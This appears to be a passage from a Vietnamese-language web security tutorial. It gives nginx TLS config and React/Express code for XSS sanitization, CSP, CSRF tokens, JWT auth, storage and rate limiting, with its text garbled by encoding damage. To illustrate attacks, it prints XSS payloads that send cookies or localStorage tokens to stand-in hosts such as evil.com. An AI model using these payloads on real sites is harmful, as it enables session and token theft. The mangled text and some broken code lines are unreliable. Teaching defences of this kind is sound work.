‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  1Ô∏è‚É£ HTTPS + TLS (Transport Layer Security)                  ‚îÇ
‚îÇ  2Ô∏è‚É£ XSS Prevention (Cross-Site Scripting)                   ‚îÇ
‚îÇ  3Ô∏è‚É£ CSRF Protection (Cross-Site Request Forgery)            ‚îÇ
‚îÇ  4Ô∏è‚É£ Authentication & Authorization                          ‚îÇ
‚îÇ  5Ô∏è‚É£ Secure Storage                                          ‚îÇ
‚îÇ  6Ô∏è‚É£ API Security                                            ‚îÇ
‚îÇ  7Ô∏è‚É£ Security Headers                                        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**Code Example (TypeScript + React):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
// 1Ô∏è‚É£ HTTPS + TLS (B·∫¢O M·∫¨T T·∫¶NG TRUY·ªÄN T·∫¢I)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch: HTTPS m√£ h√≥a d·ªØ li·ªáu gi·ªØa browser ‚Üî server
// NgƒÉn Man-in-the-Middle attack (hacker kh√¥ng ƒë·ªçc ƒë∆∞·ª£c data)

// C·∫•u h√¨nh Nginx Server
server {
  listen 443 ssl http2; // Ch√∫ gi·∫£i: Port 443 = HTTPS, http2 = protocol m·ªõi nhanh h∆°n

  # HSTS (HTTP Strict Transport Security): B·∫Øt bu·ªôc d√πng HTTPS
  # Gi·∫£i th√≠ch: Browser t·ª± ƒë·ªông chuy·ªÉn HTTP ‚Üí HTTPS trong 1 nƒÉm
  # includeSubDomains: √Åp d·ª•ng cho t·∫•t c·∫£ subdomain (api.example.com, cdn.example.com)
  # preload: ƒê∆∞a v√†o HSTS preload list c·ªßa browser (b·∫£o m·∫≠t t·ª´ l·∫ßn truy c·∫≠p ƒë·∫ßu)
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

  # C·∫•u h√¨nh SSL/TLS Certificate (Ch·ª©ng ch·ªâ b·∫£o m·∫≠t)
  ssl_certificate /path/to/cert.pem;          # Public certificate (ch·ª©ng ch·ªâ c√¥ng khai)
  ssl_certificate_key /path/to/key.pem;       # Private key (kh√≥a b√≠ m·∫≠t)

  # Ch·ªâ cho ph√©p TLS 1.2 v√† 1.3 (phi√™n b·∫£n m·ªõi, b·∫£o m·∫≠t)
  # Kh√¥ng d√πng TLS 1.0, 1.1 (ƒë√£ l·ªói th·ªùi, c√≥ l·ªó h·ªïng)
  ssl_protocols TLSv1.2 TLSv1.3;

  # Cipher suite: Thu·∫≠t to√°n m√£ h√≥a
  # HIGH = m√£ h√≥a m·∫°nh, !aNULL = kh√¥ng d√πng cipher kh√¥ng x√°c th·ª±c, !MD5 = kh√¥ng d√πng MD5 (y·∫øu)
  ssl_ciphers HIGH:!aNULL:!MD5;
}

 // Ch√∫ gi·∫£i: ============================================
// 2Ô∏è‚É£ XSS PREVENTION (NGƒÇN CH·∫∂N T·∫§N C√îNG XSS)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch XSS (Cross-Site Scripting):
// Hacker inject malicious script v√†o web ‚Üí script ch·∫°y ‚Üí steal cookies, redirect, keylog
 // Ch√∫ gi·∫£i: VD: User nh·∫≠p comment: <script>fetch('https://hacker.com?cookie='+document.cookie)</script>

// üõ°Ô∏è A. Input Sanitization (L√†m S·∫°ch Input) v·ªõi DOMPurify
import DOMPurify from 'dompurify';
import { useState, useMemo } from 'react';

function CommentForm({ onSubmit }) {
  const [comment, setComment] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // ‚úÖ Sanitize input: Lo·∫°i b·ªè script tags v√† c√°c th·∫ª nguy hi·ªÉm
    const sanitized = DOMPurify.sanitize(comment, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],  // Ch·ªâ cho ph√©p c√°c th·∫ª an to√†n
      ALLOWED_ATTR: ['href']  // Ch·ªâ cho ph√©p attribute 'href' (cho th·∫ª <a>)
    });
    // K·∫øt qu·∫£: "<script>alert('xss')</script>" ‚Üí "" (b·ªã x√≥a)
 // Ch√∫ gi·∫£i: "<b>Text</b>" ‚Üí "<b>Text</b>" (gi·ªØ l·∫°i)

    onSubmit(sanitized);
  };

  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={comment}
        onChange={(e) => setComment(e.target.value)}
        placeholder="Nh·∫≠p comment c·ªßa b·∫°n..."
      />
      <button type="submit">G·ª≠i Comment</button>
    </form>
  );
}

// ‚úÖ Safe Display: Hi·ªÉn th·ªã HTML an to√†n
function SafeComment({ content }) {
  // useMemo: Ch·ªâ sanitize l·∫°i khi content thay ƒë·ªïi
  const sanitized = useMemo(() => {
    return DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],  // Cho ph√©p format text c∆° b·∫£n
      ALLOWED_ATTR: ['href', 'target'],  // Cho ph√©p link
      ALLOW_DATA_ATTR: false  // Kh√¥ng cho ph√©p data-* attributes (c√≥ th·ªÉ ch·ª©a script)
    });
  }, [content]);

 // Ch√∫ gi·∫£i: dangerouslySetInnerHTML: Render HTML string
  // T√™n "dangerous" nh·∫Øc nh·ªü ph·∫£i sanitize tr∆∞·ªõc khi d√πng
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// ‚ùå V√ç D·ª§ T·∫§N C√îNG XSS:
 // Ch√∫ gi·∫£i: User nh·∫≠p: <img src="x" onerror="alert('XSS')">
// Kh√¥ng sanitize ‚Üí img load l·ªói ‚Üí ch·∫°y onerror ‚Üí alert hi·ªán
// C√≥ sanitize ‚Üí DOMPurify x√≥a onerror attribute ‚Üí an to√†n

// üõ°Ô∏è B. Content Security Policy (CSP) - Ch√≠nh s√°ch b·∫£o m·∫≠t n·ªôi dung
// CSP: Header ch·ªâ ƒë·ªãnh ngu·ªìn n√†o ƒë∆∞·ª£c ph√©p load scripts, styles, images
 // Ch√∫ gi·∫£i: Server: Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",  // M·∫∑c ƒë·ªãnh ch·ªâ load t·ª´ c√πng domain
      "script-src 'self' https: // Ch√∫ gi·∫£i: trusted-cdn.com",  // Script ch·ªâ t·ª´ domain + CDN tin c·∫≠y
      "style-src 'self' 'unsafe-inline'", // Ch√∫ gi·∫£i: CSS t·ª´ domain + inline styles (c·∫ßn cho React)
      "img-src 'self' data: https:", // Ch√∫ gi·∫£i: Image t·ª´ domain + data URLs + HTTPS
      "connect-src 'self' https://api.example.com",  // Fetch/WebSocket ch·ªâ ƒë·∫øn API
      "frame-ancestors 'none'"  // Kh√¥ng cho embed trong iframe (ch·ªëng clickjacking)
    ].join('; ')
  );
  next();
});
// K·∫øt qu·∫£: N·∫øu hacker inject <script src="https://evil.com/hack.js"></script>
// ‚Üí Browser BLOCK v√¨ evil.com kh√¥ng trong whitelist ‚Üí XSS th·∫•t b·∫°i

 // Ch√∫ gi·∫£i: ============================================
// 3Ô∏è‚É£ CSRF PROTECTION (NGƒÇN CH·∫∂N T·∫§N C√îNG CSRF)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch CSRF (Cross-Site Request Forgery):
// Hacker l·ª´a user click link ‚Üí browser t·ª± ƒë·ªông g·ª≠i request (k√®m cookies) ‚Üí th·ª±c hi·ªán action kh√¥ng mong mu·ªën
// VD: User ƒëang login bank.com ‚Üí click link evil.com ‚Üí evil.com trigger POST /transfer ‚Üí ti·ªÅn b·ªã chuy·ªÉn

import { useEffect, useState } from 'react';
import { randomBytes } from 'crypto';

 // Ch√∫ gi·∫£i: SERVER: Generate CSRF Token
// T·∫°o token ng·∫´u nhi√™n cho m·ªói session, l∆∞u ·ªü server
app.get('/api/csrf-token', (req, res) => {
  // T·∫°o token ng·∫´u nhi√™n 32 bytes (256 bits) ‚Üí r·∫•t kh√≥ ƒëo√°n
  const token = randomBytes(32).toString('hex');

  // L∆∞u token v√†o session (server-side, hacker kh√¥ng access ƒë∆∞·ª£c)
  req.session.csrfToken = token;

 // Ch√∫ gi·∫£i: Tr·∫£ token cho client
  res.json({ csrfToken: token });
});

// API endpoint c·∫ßn b·∫£o v·ªá
app.post('/api/transfer', (req, res) => {
  const { csrfToken, amount, toAccount } = req.body;

  // ‚úÖ Verify CSRF token: So s√°nh token t·ª´ client vs token trong session
  if (csrfToken !== req.session.csrfToken) {
    console.log('‚ùå CSRF token kh√¥ng h·ª£p l·ªá');
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  // Token h·ª£p l·ªá ‚Üí x·ª≠ l√Ω transfer
  console.log(`‚úÖ Chuy·ªÉn $${amount} ƒë·∫øn ${toAccount}`);
 // Ch√∫ gi·∫£i: Process transfer logic...
  res.json({ success: true });
});

 // Ch√∫ gi·∫£i: CLIENT: Hook l·∫•y CSRF token
function useCsrfToken() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
 // Ch√∫ gi·∫£i: Fetch token t·ª´ server khi component mount
    fetch('/api/csrf-token')
      .then(res => res.json())
      .then(data => setCsrfToken(data.csrfToken))
      .catch(err => console.error('L·ªói l·∫•y CSRF token:', err));
  }, []);

  return csrfToken;
}

// Component Form chuy·ªÉn ti·ªÅn
function TransferForm() {
  const csrfToken = useCsrfToken(); // Ch√∫ gi·∫£i: L·∫•y token
  const [amount, setAmount] = useState('');
  const [toAccount, setToAccount] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // ‚úÖ G·ª≠i CSRF token c√πng request
    // C√°ch 1: Trong body
    // C√°ch 2: Trong custom header (X-CSRF-Token)
    await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken // Ch√∫ gi·∫£i: G·ª≠i token qua header
      },
      body: JSON.stringify({
        amount,
        toAccount,
        csrfToken  // C≈©ng g·ª≠i trong body (double check)
      })
    });
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="number"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="S·ªë ti·ªÅn"
      />
      <input
        type="text"
        value={toAccount}
        onChange={(e) => setToAccount(e.target.value)}
        placeholder="T√†i kho·∫£n nh·∫≠n"
      />
      <button type="submit">Chuy·ªÉn Ti·ªÅn</button>
    </form>
  );
}

// T·∫†I SAO CSRF TOKEN HO·∫†T ƒê·ªòNG?
// 1. Site evil.com KH√îNG th·ªÉ ƒë·ªçc token t·ª´ bank.com (Same-Origin Policy)
// 2. Browser t·ª± ƒë·ªông g·ª≠i cookies ‚Üí nh∆∞ng KH√îNG t·ª± ƒë·ªông g·ª≠i custom headers/body
// 3. Request t·ª´ evil.com thi·∫øu token ‚Üí server reject ‚Üí CSRF th·∫•t b·∫°i

 // Ch√∫ gi·∫£i: ============================================
// 4Ô∏è‚É£ AUTHENTICATION & AUTHORIZATION (X√ÅC TH·ª∞C & PH√ÇN QUY·ªÄN)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch JWT (JSON Web Token):
// Token ch·ª©a th√¥ng tin user (id, email, role) ƒë∆∞·ª£c m√£ h√≥a
// Server k√Ω token b·∫±ng secret key ‚Üí client kh√¥ng th·ªÉ fake token
// 2 lo·∫°i token: Access Token (ng·∫Øn h·∫°n) + Refresh Token (d√†i h·∫°n)

import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';

 // Ch√∫ gi·∫£i: SERVER: Login API
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  // T√¨m user trong database
  const user = await User.findOne({ email });

  if (!user) {
    return res.status(401).json({ error: 'Email kh√¥ng t·ªìn t·∫°i' });
  }

  // Verify password (so s√°nh v·ªõi hash trong DB)
  const validPassword = await bcrypt.compare(password, user.passwordHash);

  if (!validPassword) {
    return res.status(401).json({ error: 'M·∫≠t kh·∫©u kh√¥ng ƒë√∫ng' });
  }

  // ‚úÖ Generate Access Token (Token truy c·∫≠p - ng·∫Øn h·∫°n: 15 ph√∫t)
  // T·∫°i sao ng·∫Øn h·∫°n? N·∫øu b·ªã ƒë√°nh c·∫Øp ‚Üí hacker ch·ªâ d√πng ƒë∆∞·ª£c 15 ph√∫t
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },  // Payload: th√¥ng tin user
    process.env.JWT_SECRET!,  // Secret key ƒë·ªÉ k√Ω token (gi·ªØ b√≠ m·∫≠t)
    { expiresIn: '15m' }  // Token h·∫øt h·∫°n sau 15 ph√∫t
  );

  // ‚úÖ Generate Refresh Token (Token l√†m m·ªõi - d√†i h·∫°n: 7 ng√†y)
  // D√πng ƒë·ªÉ l·∫•y access token m·ªõi khi access token h·∫øt h·∫°n
  const refreshToken = jwt.sign(
    { userId: user.id },  // Payload ƒë∆°n gi·∫£n h∆°n
    process.env.REFRESH_TOKEN_SECRET!,  // Secret key kh√°c v·ªõi access token
    { expiresIn: '7d' }  // 7 ng√†y
  );

  // ‚úÖ L∆∞u refresh token v√†o httpOnly cookie
  // httpOnly: JavaScript KH√îNG ƒë·ªçc ƒë∆∞·ª£c ‚Üí XSS kh√¥ng steal ƒë∆∞·ª£c
 // Ch√∫ gi·∫£i: secure: Ch·ªâ g·ª≠i qua HTTPS
  // sameSite: 'strict' ‚Üí ch·ªëng CSRF (cookie kh√¥ng g·ª≠i t·ª´ site kh√°c)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,  // JS kh√¥ng access ƒë∆∞·ª£c (ch·ªëng XSS)
    secure: true, // Ch√∫ gi·∫£i: Ch·ªâ g·ª≠i qua HTTPS
    sameSite: 'strict', // Ch√∫ gi·∫£i: Ch·ªëng CSRF
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ng√†y (milliseconds)
  });

  // Tr·∫£ access token cho client (l∆∞u trong memory, KH√îNG localStorage)
  res.json({ accessToken, user: { id: user.id, email: user.email } });
});

// API l√†m m·ªõi access token
app.post('/api/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;

  if (!refreshToken) {
    return res.status(401).json({ error: 'Kh√¥ng c√≥ refresh token' });
  }

  try {
 // Ch√∫ gi·∫£i: Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET!);

 // Ch√∫ gi·∫£i: Generate access token m·ªõi
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(403).json({ error: 'Refresh token kh√¥ng h·ª£p l·ªá' });
  }
});

 // Ch√∫ gi·∫£i: CLIENT: Auth Context v·ªõi auto-refresh
import { createContext, useContext, useEffect, useState } from 'react';

const AuthContext = createContext<{ accessToken: string | null }>({ accessToken: null });

function AuthProvider({ children }) {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // ‚úÖ Auto-refresh token tr∆∞·ªõc khi h·∫øt h·∫°n
  // Access token h·∫øt h·∫°n sau 15 ph√∫t ‚Üí refresh sau 14 ph√∫t (d∆∞ 1 ph√∫t buffer)
  useEffect(() => {
    const refreshInterval = setInterval(async () => {
      console.log('ƒêang refresh access token...');

      const res = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include' // Ch√∫ gi·∫£i: G·ª≠i cookies (ch·ª©a refresh token)
      });

      if (res.ok) {
        const data = await res.json();
        setAccessToken(data.accessToken); // Ch√∫ gi·∫£i: Update access token m·ªõi
        console.log('‚úÖ Access token ƒë√£ ƒë∆∞·ª£c l√†m m·ªõi');
      } else {
        console.log('‚ùå Refresh th·∫•t b·∫°i ‚Üí User c·∫ßn login l·∫°i');
        setAccessToken(null);
      }
    }, 14 * 60 * 1000); // 14 ph√∫t = 840,000ms

 // Ch√∫ gi·∫£i: Cleanup interval khi unmount
    return () => clearInterval(refreshInterval);
  }, []);

  return (
    <AuthContext.Provider value={{ accessToken }}>
      {children}
    </AuthContext.Provider>
  );
}

 // Ch√∫ gi·∫£i: Hook s·ª≠ d·ª•ng auth
export const useAuth = () => useContext(AuthContext);

 // Ch√∫ gi·∫£i: Component g·ªçi API v·ªõi authentication
function UserProfile() {
  const { accessToken } = useAuth();
  const [profile, setProfile] = useState(null);

  useEffect(() => {
    if (accessToken) {
      fetch('/api/profile', {
        headers: {
          'Authorization': `Bearer ${accessToken}` // Ch√∫ gi·∫£i: G·ª≠i access token trong header
        }
      })
        .then(res => res.json())
        .then(data => setProfile(data));
    }
  }, [accessToken]);

  return <div>Th√¥ng tin user: {profile?.email}</div>;
}

 // Ch√∫ gi·∫£i: ============================================
// 5Ô∏è‚É£ SECURE STORAGE (L∆ØU TR·ªÆ AN TO√ÄN)
 // Ch√∫ gi·∫£i: ============================================

// Nguy√™n t·∫Øc: KH√îNG BAO GI·ªú l∆∞u sensitive data ·ªü client-side (localStorage/sessionStorage)
// L√Ω do: XSS attack c√≥ th·ªÉ ƒë·ªçc localStorage ‚Üí steal tokens, passwords, credit cards

// ‚ùå C√ÅCH L∆ØU KH√îNG AN TO√ÄN
// localStorage/sessionStorage: JavaScript c√≥ th·ªÉ ƒë·ªçc ‚Üí XSS steal ƒë∆∞·ª£c
localStorage.setItem('token', accessToken); // ‚ùå XSS ƒë·ªçc ƒë∆∞·ª£c!
localStorage.setItem('refreshToken', refreshToken); // ‚ùå R·∫•t nguy hi·ªÉm!
localStorage.setItem('creditCard', '1234-5678-9012-3456'); // ‚ùå KH√îNG BAO GI·ªú l√†m!
localStorage.setItem('password', 'user123'); // ‚ùå C·ª±c k·ª≥ nguy hi·ªÉm!

// K·ªãch b·∫£n t·∫•n c√¥ng:
 // Ch√∫ gi·∫£i: 1. Hacker inject XSS: <script>fetch('https://evil.com?data='+localStorage.getItem('token'))</script>
// 2. Script ch·∫°y ‚Üí ƒë·ªçc localStorage ‚Üí g·ª≠i token v·ªÅ server hacker
// 3. Hacker d√πng token ‚Üí truy c·∫≠p account c·ªßa user

// ‚úÖ C√ÅCH L∆ØU AN TO√ÄN

 // Ch√∫ gi·∫£i: 1. HttpOnly Cookies cho Refresh Token (b·∫£o m·∫≠t nh·∫•t)
// httpOnly: JavaScript KH√îNG th·ªÉ ƒë·ªçc ‚Üí XSS kh√¥ng steal ƒë∆∞·ª£c
 // Ch√∫ gi·∫£i: Server set cookie trong response:
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,    // ‚úÖ JS kh√¥ng access ƒë∆∞·ª£c
  secure: true, // Ch√∫ gi·∫£i: ‚úÖ Ch·ªâ g·ª≠i qua HTTPS
  sameSite: 'strict', // Ch√∫ gi·∫£i: ‚úÖ Ch·ªëng CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ng√†y
});

// Client kh√¥ng th·ªÉ ƒë·ªçc cookie n√†y:
console.log(document.cookie); // Kh√¥ng th·∫•y refreshToken (v√¨ httpOnly)

 // Ch√∫ gi·∫£i: 2. Memory-only cho Access Token (l∆∞u trong React state/context)
 // Ch√∫ gi·∫£i: Access token ch·ªâ t·ªìn t·∫°i trong memory ‚Üí m·∫•t khi reload page
function App() {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // Khi login th√†nh c√¥ng
  const handleLogin = async (email: string, password: string) => {
    const res = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    });

    const data = await res.json();
    setAccessToken(data.accessToken); // Ch√∫ gi·∫£i: ‚úÖ L∆∞u trong memory (React state)
    // KH√îNG l∆∞u v√†o localStorage
  };

  return <div>App content...</div>;
}

// 3. Session Storage (t·ªët h∆°n localStorage nh∆∞ng v·∫´n c√≥ risk)
// sessionStorage: T·ªìn t·∫°i trong 1 tab, m·∫•t khi ƒë√≥ng tab
// V·∫´n c√≥ th·ªÉ b·ªã XSS steal ‚Üí ch·ªâ d√πng cho non-sensitive data
sessionStorage.setItem('theme', 'dark'); // ‚úÖ OK cho data kh√¥ng nh·∫°y c·∫£m
sessionStorage.setItem('language', 'vi'); // Ch√∫ gi·∫£i: ‚úÖ OK

// ‚ùå KH√îNG d√πng cho sensitive data
sessionStorage.setItem('token', token); // ‚ùå V·∫´n c√≥ XSS risk

// 4. Encrypted Storage (M√£ h√≥a tr∆∞·ªõc khi l∆∞u - fallback option)
// Ch·ªâ d√πng khi B·∫ÆT BU·ªòC ph·∫£i l∆∞u client-side
import CryptoJS from 'crypto-js';

const SECRET_KEY = 'your-encryption-key'; // L·∫•y t·ª´ env ho·∫∑c server

 // Ch√∫ gi·∫£i: Encrypt tr∆∞·ªõc khi l∆∞u
const encryptData = (data: string) => {
  return CryptoJS.AES.encrypt(data, SECRET_KEY).toString();
};

// Decrypt khi ƒë·ªçc
const decryptData = (encrypted: string) => {
  const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
  return bytes.toString(CryptoJS.enc.Utf8);
};

// L∆∞u data ƒë√£ m√£ h√≥a
const encrypted = encryptData(sensitiveData);
localStorage.setItem('data', encrypted);

// ƒê·ªçc v√† gi·∫£i m√£
const encrypted = localStorage.getItem('data');
const decrypted = decryptData(encrypted);

// ‚ö†Ô∏è L∆ØU √ù: Encryption KH√îNG an to√†n 100%
// - Secret key v·∫´n ·ªü client ‚Üí hacker c√≥ th·ªÉ t√¨m th·∫•y
// - Ch·ªâ l√†m kh√≥ hacker h∆°n, KH√îNG ngƒÉn ƒë∆∞·ª£c ho√†n to√†n

// üìã B·∫¢NG SO S√ÅNH STORAGE OPTIONS
/*
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Storage Type         ‚îÇ XSS Risk    ‚îÇ CSRF Risk   ‚îÇ Best Use Case    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ HttpOnly Cookie      ‚îÇ ‚úÖ Low      ‚îÇ ‚ö†Ô∏è Medium   ‚îÇ Refresh Token    ‚îÇ
‚îÇ Memory (React State) ‚îÇ ‚úÖ Low      ‚îÇ ‚úÖ Low      ‚îÇ Access Token     ‚îÇ
‚îÇ localStorage         ‚îÇ ‚ùå High     ‚îÇ ‚úÖ Low      ‚îÇ Non-sensitive    ‚îÇ
‚îÇ sessionStorage       ‚îÇ ‚ùå High     ‚îÇ ‚úÖ Low      ‚îÇ Non-sensitive    ‚îÇ
‚îÇ Encrypted Storage    ‚îÇ ‚ö†Ô∏è Medium   ‚îÇ ‚úÖ Low      ‚îÇ Fallback only    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
*/

 // Ch√∫ gi·∫£i: ‚úÖ BEST PRACTICE:
 // Ch√∫ gi·∫£i: - Refresh Token ‚Üí httpOnly cookie (server-side)
 // Ch√∫ gi·∫£i: - Access Token ‚Üí React state/Context (memory)
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
 // Ch√∫ gi·∫£i: - NEVER store passwords, credit cards, API keys trong client

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 6Ô∏è‚É£ API SECURITY (B·∫¢O M·∫¨T API)
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üõ°Ô∏è A. Rate Limiting (Gi·ªõi H·∫°n S·ªë Request)
// M·ª•c ƒë√≠ch: NgƒÉn DDoS attack, brute-force attack, spam
// VD: Hacker th·ª≠ 1 tri·ªáu passwords ‚Üí rate limit ch·∫∑n sau 5 l·∫ßn th·ª≠

const rateLimit = require('express-rate-limit');

// Rate limiter cho to√†n b·ªô API
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // C·ª≠a s·ªï th·ªùi gian: 15 ph√∫t
  max: 100, // T·ªëi ƒëa 100 requests trong 15 ph√∫t (t·ª´ 1 IP)
  message: 'Qu√° nhi·ªÅu requests, vui l√≤ng th·ª≠ l·∫°i sau',
  standardHeaders: true, // Tr·∫£ v·ªÅ RateLimit headers (X-RateLimit-*)
  legacyHeaders: false,  // T·∫Øt headers c≈©
});

// √Åp d·ª•ng cho t·∫•t c·∫£ API routes
app.use('/api/', apiLimiter);

// Rate limiter nghi√™m ng·∫∑t h∆°n cho login (ch·ªëng brute-force)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 ph√∫t
  max: 5, // Ch·ªâ cho 5 l·∫ßn th·ª≠ login trong 15 ph√∫t
  message: 'Qu√° nhi·ªÅu l·∫ßn th·ª≠ login, t√†i kho·∫£n t·∫°m kh√≥a 15 ph√∫t',
  skipSuccessfulRequests: true // Kh√¥ng ƒë·∫øm request th√†nh c√¥ng
});

app.post('/api/login', loginLimiter, async (req, res) => {
 // Ch√∫ gi·∫£i: Login logic...
});

// üõ°Ô∏è B. Input Validation (Ki·ªÉm Tra D·ªØ Li·ªáu ƒê·∫ßu V√†o)
// Nguy√™n t·∫Øc: KH√îNG BAO GI·ªú tin t∆∞·ªüng input t·ª´ client
// Lu√¥n validate ·ªü server-side (client validation c√≥ th·ªÉ b·ªã bypass)

import { z } from 'zod'; // Th∆∞ vi·ªán validation m·∫°nh m·∫Ω

 // Ch√∫ gi·∫£i: Schema cho transfer request
const transferSchema = z.object({
  amount: z.number()
    .positive('S·ªë ti·ªÅn ph·∫£i > 0')  // Ph·∫£i l√† s·ªë d∆∞∆°ng
    .max(1000000, 'S·ªë ti·ªÅn t·ªëi ƒëa 1 tri·ªáu'),  // Gi·ªõi h·∫°n tr√™n

  accountNumber: z.string()
    .regex(/^\d{10}$/, 'S·ªë t√†i kho·∫£n ph·∫£i c√≥ 10 ch·ªØ s·ªë'),  // ƒê√∫ng format

  description: z.string()
    .max(200, 'M√¥ t·∫£ t·ªëi ƒëa 200 k√Ω t·ª±')
    .optional()  // Field kh√¥ng b·∫Øt bu·ªôc
});

 // Ch√∫ gi·∫£i: API endpoint v·ªõi validation
app.post('/api/transfer', async (req, res) => {
  try {
 // Ch√∫ gi·∫£i: ‚úÖ Validate input v·ªõi Zod
    const data = transferSchema.parse(req.body);

